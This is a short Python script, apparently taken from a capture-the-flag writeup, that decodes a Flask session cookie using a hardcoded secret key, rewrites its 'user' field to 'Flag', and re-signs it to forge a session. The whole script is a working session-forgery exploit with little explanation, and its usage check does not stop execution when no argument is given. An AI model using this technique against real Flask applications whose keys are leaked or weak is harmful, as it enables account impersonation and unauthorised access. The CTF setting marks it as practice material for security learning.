import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer
from sys import argv

# script from https://ctftime.org/writeup/11812

KEY = '4cf129f6c1e7d7a7a96d944b78a935ac'


def decode_flask_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.loads(cookie_str)


def encode_flask_cookie(secret_key, cookie):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.dumps(cookie)


if __name__ == '__main__':
    try:
        cookie = argv[1]
    except IndexError:
        print(f'usage: {argv[0]} [COOKIE]')
    cookie_val = (decode_flask_cookie(KEY, cookie))
    new_cookie = dict(cookie_val)
    new_cookie['user'] = 'Flag'
    print(encode_flask_cookie(KEY, new_cookie))
